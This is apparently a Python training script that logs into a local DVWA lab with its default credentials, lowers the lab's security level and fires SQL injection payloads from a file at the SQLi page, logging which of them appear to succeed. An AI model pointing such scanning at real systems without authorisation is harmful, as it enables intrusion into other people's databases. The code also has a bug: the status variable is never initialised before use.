import requests
import time
from bs4 import BeautifulSoup

BASE_URL = "http://127.0.0.1:8080/dvwa"
LOGIN_URL = BASE_URL + "/login.php"
SQLI_URL = BASE_URL + "/vulnerabilities/sqli/"
SECURITY_URL = BASE_URL + "/security.php"

USERNAME = "admin"
PASSWORD = "password"


def login(session):
    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Referer": BASE_URL + "/login.php"
    })

    response = session.get(LOGIN_URL)
    soup = BeautifulSoup(response.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})["value"]

    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    response = session.post(LOGIN_URL, data=login_data)

    if "Logout" in response.text:
        print("✅ Login Successful")
        return True
    else:
        print("❌ Login Failed")
        return False
def set_security_low(session):
    page = session.get(SECURITY_URL)
    soup = BeautifulSoup(page.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    session.post(
        SECURITY_URL,
        data={
            "security": "low",
            "seclev_submit": "Submit",
            "user_token": token
        }
    )
    print("🔓 SQLi Security set to LOW")

print("Using BASE_URL:", BASE_URL)
def run_sqli_scan():
    session = requests.Session()

    if not login(session):
        return

    set_security_low(session)

    normal = session.get(SQLI_URL, params={"id": "1", "Submit": "Submit"})
    normal_length = len(normal.text)

    with open("payloads.txt") as f:
        payloads = [p.strip() for p in f if p.strip()]

    with open("results.txt", "a", encoding="utf-8") as result_file:
        result_file.write("===== SQL Injection Scan Results =====\n")

        for payload in payloads:
            response = session.get(SQLI_URL, params={
                "id": payload,
                "Submit": "Submit"
            })

            
            if payload in response.text:
                status = "Reflected"
            if "First name:" in response.text and payload != "1":
                status = "Vulnerable"

            if "You have an error in your SQL" in response.text:
                status = "Vulnerable"

            output = f"[SQLi] {payload} -> {status}"
            print(output)
            result_file.write(output + "\n")

        result_file.write("\n")

    print("✅ SQLi Scan Done")